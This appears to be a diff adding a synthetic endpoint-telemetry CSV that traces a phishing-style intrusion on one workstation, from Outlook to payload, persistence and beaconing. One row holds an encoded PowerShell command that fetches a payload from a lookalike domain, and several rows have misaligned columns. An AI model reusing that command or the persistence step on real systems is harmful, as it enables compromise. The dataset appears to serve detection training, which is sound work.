@@ -1,1 +1,11 @@
-
+ts,host,user,event_type,process,parent_process,cmdline,hash,network_dst,network_port,action,notes
+2026-03-05T13:01:40Z,WS-023,alex,PROCESS_CREATE,outlook.exe,explorer.exe,"outlook.exe",,,,"ALLOW",User opens email client
+2026-03-05T13:02:05Z,WS-023,alex,PROCESS_CREATE,powershell.exe,outlook.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACcAaAB0AHQAcAA6AC8ALwB1AHAAZABhAHQAZQAtAG0AaQBjAHIAbwBzAG8AZgB0AC0AcwBlAGMAdQByAGkAdAB5AC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApAA==",,,,"ALLOW",Encoded PowerShell spawned by Outlook
+2026-03-05T13:02:20Z,WS-023,alex,NETWORK_CONNECT,powershell.exe,outlook.exe,,,"update-microsoft-security[.]com",80,"ALLOW",Outbound HTTP from PowerShell
+2026-03-05T13:02:26Z,WS-023,alex,FILE_WRITE,powershell.exe,outlook.exe,"C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe",abcd1234,,,,,"ALLOW",Executable written to temp
+2026-03-05T13:02:33Z,WS-023,alex,PROCESS_CREATE,payload.exe,powershell.exe,"C:\\Users\\alex\\AppData\\Local\\Temp\\payload.exe /silent",abcd1234,,,,,"ALLOW",Payload executed
+2026-03-05T13:03:10Z,WS-023,SYSTEM,REG_PERSIST,payload.exe,,,"",,"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater","SET",Persistence via Run key
+2026-03-05T13:04:40Z,WS-023,alex,NETWORK_CONNECT,payload.exe,,,"cdn-assets-sync[.]net",443,"ALLOW",Possible C2 over TLS
+2026-03-05T13:05:40Z,WS-023,alex,NETWORK_CONNECT,payload.exe,,,"cdn-assets-sync[.]net",443,"ALLOW",Repeat connection suggests beaconing
+2026-03-05T13:06:40Z,WS-023,alex,NETWORK_CONNECT,payload.exe,,,"cdn-assets-sync[.]net",443,"ALLOW",Repeat connection suggests beaconing
+2026-03-05T13:10:12Z,WS-014,casey,PROCESS_CREATE,chrome.exe,explorer.exe,"chrome.exe https://news.example.com",,,,"ALLOW",Normal browsing baseline
